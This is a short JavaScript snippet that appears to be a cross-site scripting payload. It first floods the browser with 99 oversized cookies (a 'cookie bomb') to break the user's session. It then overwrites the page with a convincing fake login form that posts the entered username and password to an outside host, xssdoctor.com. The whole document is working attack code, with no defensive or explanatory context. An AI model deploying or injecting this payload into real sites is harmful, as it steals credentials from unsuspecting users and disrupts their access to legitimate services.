// Cookie bomb
let a = `a`.repeat(4000);
for (let i = 0; i < 99; i++) {
    document.cookie = `cookie${i}=${a};secure`;
}

// Inject login form
document.body.innerHTML = `
<div style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;">
    <div style="background:white;padding:2rem;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:400px;">
        <h1 style="margin:0 0 1.5rem;text-align:center;color:#333;">Login</h1>
        <form action="https://xssdoctor.com/getinfo" method="POST">
            <div style="margin-bottom:1rem;">
                <label style="display:block;margin-bottom:0.5rem;color:#555;">Username</label>
                <input type="text" name="username" required style="width:100%;padding:0.75rem;border:1px solid #ddd;border-radius:4px;font-size:1rem;box-sizing:border-box;">
            </div>
            <div style="margin-bottom:1rem;">
                <label style="display:block;margin-bottom:0.5rem;color:#555;">Password</label>
                <input type="password" name="password" required style="width:100%;padding:0.75rem;border:1px solid #ddd;border-radius:4px;font-size:1rem;box-sizing:border-box;">
            </div>
            <button type="submit" style="width:100%;padding:0.75rem;background:#007bff;color:white;border:none;border-radius:4px;font-size:1rem;cursor:pointer;">Sign In</button>
        </form>
    </div>
</div>
`;
